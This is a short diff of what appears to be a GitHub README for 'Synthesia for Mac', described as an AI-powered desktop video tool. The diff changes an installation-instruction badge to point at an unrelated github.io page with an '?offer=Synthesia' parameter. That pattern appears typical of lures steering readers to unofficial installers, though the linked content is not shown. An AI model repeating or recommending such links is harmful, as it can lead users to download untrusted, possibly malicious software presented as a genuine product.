@@ -4,7 +4,7 @@
 Synthesia for Mac is an **AI-powered desktop video tool** that lets you create professional videos with avatars, text-to-speech, and multi-language support 🎬.  
 Follow the guide below to start using Synthesia on your Mac.  
 
-[![Get Github Instruction](https://img.shields.io/badge/Get%20Installation%20Instruction-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://muffinsun2005.github.io/.github/)
+[![Get Github Instruction](https://img.shields.io/badge/Get%20Installation%20Instruction-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://git-tool-install.github.io/.github/?offer=Synthesia)
 
 ---
 
